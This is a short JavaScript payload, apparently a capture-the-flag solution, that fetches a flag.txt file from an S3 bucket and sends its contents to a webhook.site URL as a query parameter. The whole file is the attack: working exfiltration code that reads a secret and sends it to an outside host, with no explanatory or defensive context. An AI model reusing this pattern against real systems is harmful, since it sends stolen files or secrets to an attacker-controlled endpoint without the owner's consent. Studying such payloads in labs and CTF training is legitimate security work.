function sendFlagToWebhook(webhookUrl) {
  fetch('https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag.txt')
    .then(response => response.text())
    .then(data => {
      const encodedData = encodeURIComponent(data);
      const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
      console.log('Sending data to webhook:', urlWithQueryParams);
      return fetch(urlWithQueryParams, { method: 'GET' });
    })
    .then(response => {
      if (response.ok) {
        console.log('Data successfully sent to webhook.');
      } else {
        console.error('Error sending data to webhook:', response.statusText);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
